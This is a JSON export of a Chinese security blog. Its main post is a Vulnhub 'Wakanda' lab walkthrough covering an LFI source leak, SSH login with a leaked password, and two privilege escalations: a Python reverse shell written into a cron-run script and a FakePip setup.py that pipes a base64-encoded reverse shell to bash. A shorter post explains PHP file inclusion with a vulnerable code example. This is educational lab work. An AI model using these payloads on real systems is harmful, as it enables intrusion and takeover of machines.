{"meta":{"title":"C0debreak's Blog","subtitle":null,"description":null,"author":"P0tato","url":"http://yoursite.com","root":"/"},"pages":[{"title":"","date":"2019-07-15T15:53:06.546Z","updated":"2019-07-15T15:53:06.495Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"title: about date: 2019-07-15 22:54:02 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"categories","date":"2020-06-09T15:39:50.000Z","updated":"2020-06-09T15:40:26.501Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-06-09T15:39:43.000Z","updated":"2020-06-09T15:41:19.853Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"Vulnhub靶机渗透——Wakanda","slug":"Vulnhub靶机渗透——Wakanda","date":"2020-06-16T16:26:44.916Z","updated":"2020-06-27T15:18:47.261Z","comments":true,"path":"2020/06/17/Vulnhub靶机渗透——Wakanda/","link":"","permalink":"http://yoursite.com/2020/06/17/Vulnhub靶机渗透——Wakanda/","excerpt":"0x00 前言靶机地址：https://www.vulnhub.com/entry/wakanda-1,251/# 使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。 0x01 目标探测我们先使用ipconfig命令来查看下本地ip，然后再使用netdiscover命令和arp -l命令来探测局域网内有哪些存活的主机。","text":"0x00 前言靶机地址：https://www.vulnhub.com/entry/wakanda-1,251/# 使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。 0x01 目标探测我们先使用ipconfig命令来查看下本地ip，然后再使用netdiscover命令和arp -l命令来探测局域网内有哪些存活的主机。 12345678910root@kali:~# ifconfigeth0: flags=4163 mtu 1500 inet 192.168.199.211 netmask 255.255.255.0 broadcast 192.168.199.255 inet6 fe80::20c:29ff:fef9:c363 prefixlen 64 scopeid 0x20 ether 00:0c:29:f9:c3:63 txqueuelen 1000 (Ethernet) RX packets 570 bytes 187830 (183.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 73307 bytes 4399916 (4.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0...... kali在eth0上的IP地址和掩码为192.168.199.211/24。netdiscover和arp -l结果如下： 123456789101112131415161718root@kali:~# netdiscover -i eth0Currently scanning: 172.16.28.0/16 | Screen View: Unique Hosts 18 Captured ARP Req/Rep packets, from 11 hosts. Total size: 1080 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.199.1 d4:ee:07:60:2d:18 5 300 HIWIFI Co., Ltd. 192.168.199.122 04:cf:8c:24:ec:b2 3 180 XIAOMI Electronics,CO., 192.168.199.248 08:1f:71:30:18:db 1 60 TP-LINK TECHNOLOGIES CO 192.168.199.105 08:00:27:3c:1e:db 2 120 PCS Systemtechnik GmbH 192.168.199.123 44:23:7c:7b:79:bf 1 60 Beijing Xiaomi Mobile S 192.168.199.151 00:02:ee:90:5c:3d 1 60 Nokia Danmark A/S 192.168.199.167 50:ec:50:39:89:bd 1 60 Beijing Xiaomi Mobile S 192.168.199.183 44:23:7c:6d:18:07 1 60 Beijing Xiaomi Mobile S 192.168.199.201 44:23:7c:84:61:e9 1 60 Beijing Xiaomi Mobile S 192.168.199.188 cc:66:0a:2f:ec:be 1 60 Apple, Inc. 192.168.199.247 a4:cf:12:c6:bd:d3 1 60 Espressif Inc. 1234567891011121314151617root@kali:~# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:f9:c3:63, IPv4: 192.168.199.211Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.199.1 d4:ee:07:60:2d:18 HIWIFI Co., Ltd.192.168.199.105 08:00:27:3c:1e:db PCS Systemtechnik GmbH192.168.199.105 08:00:27:3c:1e:db PCS Systemtechnik GmbH (DUP: 2)192.168.199.122 04:cf:8c:24:ec:b2 XIAOMI Electronics,CO.,LTD192.168.199.123 44:23:7c:7b:79:bf Beijing Xiaomi Mobile Software Co., Ltd192.168.199.151 00:02:ee:90:5c:3d Nokia Danmark A/S192.168.199.167 50:ec:50:39:89:bd Beijing Xiaomi Mobile Software Co., Ltd192.168.199.201 44:23:7c:84:61:e9 Beijing Xiaomi Mobile Software Co., Ltd192.168.199.188 cc:66:0a:2f:ec:be Apple, Inc.192.168.199.247 a4:cf:12:c6:bd:d3 Espressif Inc.192.168.199.101 12:31:0a:85:a6:09 (Unknown: locally administered)11 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 2.323 seconds (110.20 hosts/sec). 11 responded 可以看到，除了192.168.199.105 08:00:27:3c:1e:db PCS Systemtechnik GmbH这个ip之外，其他应该都是正常使用的ip，192.168.199.105应该就是我们这次靶机的ip。 0x02 端口/服务扫描先使用nmap扫描靶机开放端口，结果如下： 123456789101112131415root@kali:~# nmap -p- -sV 192.168.199.105Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 10:15 EDTNmap scan report for 192.168.199.105Host is up (0.00050s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))111/tcp open rpcbind 2-4 (RPC #100000)3333/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)34509/tcp open status 1 (RPC #100024)MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds 比较明显的是开放了80的web端口和3333的ssh端口，另外还有34509端口比较可疑。网页打开看了一下，是一个振金市场的主页。 使用nikto扫描下网站，看网站是否存在漏洞或者信息泄露： 1234567891011121314151617181920root@kali:~# nikto -h http://192.168.199.105- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.199.105+ Target Hostname: 192.168.199.105+ Target Port: 80+ Start Time: 2020-06-16 12:51:18 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3233: /icons/README: Apache default file found.+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host+ End Time: 2020-06-16 12:52:17 (GMT-4) (59 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 但是没发现什么有用的信息，于是接着用dirb来暴力枚举下网站目录： 1234567891011121314151617181920root@kali:~# dirb http://192.168.199.105 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Tue Jun 16 12:49:43 2020 URL_BASE: http://192.168.199.105/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.199.105/ ----+ http://192.168.199.105/admin (CODE:200|SIZE:0) + http://192.168.199.105/backup (CODE:200|SIZE:0) + http://192.168.199.105/index.php (CODE:200|SIZE:1527) + http://192.168.199.105/secret (CODE:200|SIZE:0) + http://192.168.199.105/server-status (CODE:403|SIZE:303) + http://192.168.199.105/shell (CODE:200|SIZE:0) -----------------END_TIME: Tue Jun 16 12:49:47 2020DOWNLOADED: 4612 - FOUND: 6 挨个访问了下，似乎没什么有用的东西。不过查看网页源码的过程中，发现一条有趣的注释： 1Fr/a> lang代表可以切换的语言，尝试直接在url中包含lang参数？lang=fr，发现页面中间的部分语言切换成了法语。这里可能存在本地文件包含(LFI)和远程文件包含(RFI)漏洞。 0x03 LFI获取源码考虑到可能存在LFI或者RFI漏洞，因为除了index.php其他的页面似乎没有什么可以突破的点，尝试用php伪协议读取下index.php的源码： 1http://192.168.199.105/?lang=php://filter/convert.base64-encode/resource=index 这里我们获取到的是base64之后的页面源码，解密后在开头部分发现一部分php源码，包含了一个密码： 12345678 另外原始网页源码中还包含了一部分明文，标明了作者是mamadou： 12345Vibranium MarketHomeComing soonMade by@mamadou 联想到之前nmap扫描到的ssh服务，尝试用这个用户名mamadou和密码Niamey4Ever227!!!登录下： 1234567891011121314root@kali:~# ssh mamadou@192.168.199.105 -p 3333mamadou@192.168.199.105's password: The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Feb 29 14:22:02 2020 from kali.lanPython 2.7.9 (default, Jun 29 2016, 13:08:31) [GCC 4.9.2] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.>>> 0x04 切换Bashssh连过去之后是一个python的shell，不是太方便操作。先用python切换到/bin/bash，切换之后是mamadou的用户。 123>>> import pty>>> pty.spawn(\"/bin/bash\")mamadou@Wakanda1:~$ 先直接使用find命令全局搜索一下flag哈哈哈，注意这里如果我们直接搜索的话会出现一大堆没有权限的返回结果，可以使用2>/dev/null来丢弃掉所有的错误输出。/dev/null是Linux一个特殊的设备文件，这个文件接收到的任何数据都会被丢弃，通常也被成为位桶(bit bucket)。 123456789mamadou@Wakanda1:~$ find / -name \"flag*\" 2>/dev/null/sys/devices/pci0000:00/0000:00:03.0/net/eth0/flags/sys/devices/virtual/net/lo/flags/sys/devices/platform/serial8250/tty/ttyS0/flags/sys/devices/platform/serial8250/tty/ttyS1/flags/sys/devices/platform/serial8250/tty/ttyS2/flags/sys/devices/platform/serial8250/tty/ttyS3/flags/home/devops/flag2.txt/home/mamadou/flag1.txt 发现了mamadou和devops两个目录下的flag文件，mamadou目录下的flag1.txt可以直接访问，devops则没有权限访问。现在我们拿到第一个flag了~ 1234mamadou@Wakanda1:~$ cat /home/mamadou/flag1.txt Flag : d86b9ad71ca887f4dd1dac86ba1c4dfcmamadou@Wakanda1:~$ cat /home/devops/flag2.txt cat: /home/devops/flag2.txt: Permission denied mamadou用户不出意外看起来没办法直接sudo，只能找找有没有什么其他曲线救国的方法。 0x05 利用Devops用户权限&&反向连接先使用cat /etc/passwd查看下靶机上的用户及权限： 123456789101112131415161718192021222324252627282930mamadou@Wakanda1:/var/mail$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/falseDebian-exim:x:104:109::/var/spool/exim4:/bin/falsemessagebus:x:105:110::/var/run/dbus:/bin/falsestatd:x:106:65534::/var/lib/nfs:/bin/falseavahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falsesshd:x:108:65534::/var/run/sshd:/usr/sbin/nologinmamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/pythondevops:x:1001:1002:,,,:/home/devops:/bin/bash 发现之前发现的devops是有/bin/bash权限的，可以查看下用户为devops的文件，看是否能提权到devops用户权限，有以下一些可能存在利用点的文件。 12345678mamadou@Wakanda1:/var/mail$ find / -user devops 2>/dev/null/srv/.antivirus.py/tmp/test/home/devops/home/devops/.bashrc/home/devops/.profile/home/devops/.bash_logout/home/devops/flag2.txt 挨个查看下文件权限。 123456789101112131415mamadou@Wakanda1:/home/devops$ ls -latotal 24drwxr-xr-x 2 devops developer 4096 Aug 5 2018 .drwxr-xr-x 4 root root 4096 Aug 1 2018 ..lrwxrwxrwx 1 root root 9 Aug 5 2018 .bash_history -> /dev/null-rw-r--r-- 1 devops developer 220 Aug 1 2018 .bash_logout-rw-r--r-- 1 devops developer 3515 Aug 1 2018 .bashrc-rw-r----- 1 devops developer 42 Aug 1 2018 flag2.txt-rw-r--r-- 1 devops developer 675 Aug 1 2018 .profilemamadou@Wakanda1:/home/devops$ cd /srv/mamadou@Wakanda1:/srv$ ls -latotal 12drwxr-xr-x 2 root root 4096 Aug 1 2018 .drwxr-xr-x 22 root root 4096 Aug 1 2018 ..-rw-r--rw- 1 devops developer 256 Feb 29 12:06 .antivirus.py 发现/srv/.antivirus.py的隐藏文件权限为646，任何用户都可以对其进行修改，文件中python源码如下。 1open('/tmp/test','w').write('test') 并且系统后台一直有进程在重复运行/srv/.antivirus.py 1devops 1366 1 0 12:09 ? 00:00:00 python /srv/.antivirus.py /srv/.antivirus.py用户权限是devops，如果我们修改/srv/.antiviru.py文件中的内容为python的反向连接脚本，那后台的进程在执行/srv/.antivirus.py脚本时就会运行我们的反向连接脚本，从而我们可以获得到devops的反向shell。 12345678910mamadou@Wakanda1:/srv$ cat ./.antivirus.py open('/tmp/test','w').write('test')import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"192.168.199.211\",1238))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/bash\",\"-i\"]) 因为之前暂停过虚拟机，后台python进程已经很久没有运行过了，于是我们先监听端口然后重启下靶机，然后我们监听端口的bash就成功获得了shell连接。 12345678root@kali:~# nc -lvp 1235listening on [any] 1235 ...connect to [192.168.199.211] from Wakanda1.lan [192.168.199.105] 37062bash: cannot set terminal process group (479): Inappropriate ioctl for devicebash: no job control in this shelldevops@Wakanda1:/$ idid uid=1001(devops) gid=1002(developer) groups=1002(developer) 得到了第二个flag~ 12345678devops@Wakanda1:/$ cd /home/devopscd /home/devopsdevops@Wakanda1:~$ lslsflag2.txtdevops@Wakanda1:~$ cat flag2.txtcat flag2.txtFlag 2 : d8ce56398c88e1b4d9e5f83e64c79098 0x06 获取root权限当前是在devops权限下，先使用sudo -l查看下devops用户有哪些权限： 12345678devops@Wakanda1:~$ sudo -lsudo -lMatching Defaults entries for devops on Wakanda1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser devops may run the following commands on Wakanda1: (ALL) NOPASSWD: /usr/bin/pip 最后一行提示可以不用输入密码执行的命令是/usr/bin/pip。github上有相关的利用 进行提权的脚本，先将利用脚本下载到本地，然后修改localhost为本地kali ip192.168.199.211： 1234567891011121314151617181920212223242526from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install): def run(self): install.run(self) LHOST = 'localhost' # 修改为本地kali地址 LPORT = 13372 reverse_shell = 'python -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT) encoded = base64.b64encode(reverse_shell) os.system('echo %s|base64 -d|bash' % encoded)setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *', url='https://github.com/0x00-0x00/fakepip', author='zc00l', author_email='andre.marques@esecurity.com.br', license='MIT', zip_safe=False, cmdclass={'install': CustomInstall}) 在本地开启http服务，这样就可以在靶机侧下载exp： 12root@kali:/mnt/zxf/fakepip# python -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 ... 1234567891011121314devops@Wakanda1:~/fakepip$ pwdpwd/home/devops/fakepipdevops@Wakanda1:~/fakepip$ wget http://192.168.199.211:8000/setup.pywget http://192.168.199.211:8000/setup.py--2020-02-29 18:54:52-- http://192.168.199.211:8000/setup.pyConnecting to 192.168.199.211:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 1015 [text/plain]Saving to: ‘setup.py’ 0K 100% 66.7M=0s2020-02-29 18:54:52 (66.7 MB/s) - ‘setup.py’ saved [1015/1015] 之后现在本地kali监听脚本中指定的端口13372： 12root@kali:/mnt/zxf/fakepip# nc -lvvp 13372listening on [any] 13372 ... 在靶机侧用devops用户执行以下命令，来获取反向shell: 1sudo /usr/bin/pip install . --upgrade --force-reinstall 12345678910devops@Wakanda1:~/fakepip$ lslssetup.pydevops@Wakanda1:~/fakepip$ sudo /usr/bin/pip install . --upgrade --force-reinstall { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/categories/Web/"}],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://yoursite.com/tags/Vulnhub/"}]},{"title":"文件包含漏洞分析","slug":"LFI","date":"2019-07-17T12:36:57.641Z","updated":"2020-06-16T17:01:27.138Z","comments":true,"path":"2019/07/17/LFI/","link":"","permalink":"http://yoursite.com/2019/07/17/LFI/","excerpt":"0x00 漏洞简介如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（Local File Inclusion）和远程文件包含(Remote File Inclusion)。allow_url_fopen和allow_url_include为on的情况认为是远程文件包含漏洞，allow_url_fopen为off和allow_url_include为on为本地文件包含漏洞。","text":"0x00 漏洞简介如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（Local File Inclusion）和远程文件包含(Remote File Inclusion)。allow_url_fopen和allow_url_include为on的情况认为是远程文件包含漏洞，allow_url_fopen为off和allow_url_include为on为本地文件包含漏洞。 0x01 漏洞成因文件包含漏洞的产生原因是通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入。当被包含的文件在服务器本地时，就形成本地文件包含漏洞。 0x02 实例分析12345if ($_GET['func']) { include $_GET['func'];} else { include 'default.php';} 程序的本意可能是当提交url为http://example.com/index.php?func=add.php时，调用add.php里面的样式内容和功能。直接访问http://example.com/index.php则会包含默认的default.php。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/categories/Web/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"http://yoursite.com/tags/文件包含/"}]}]}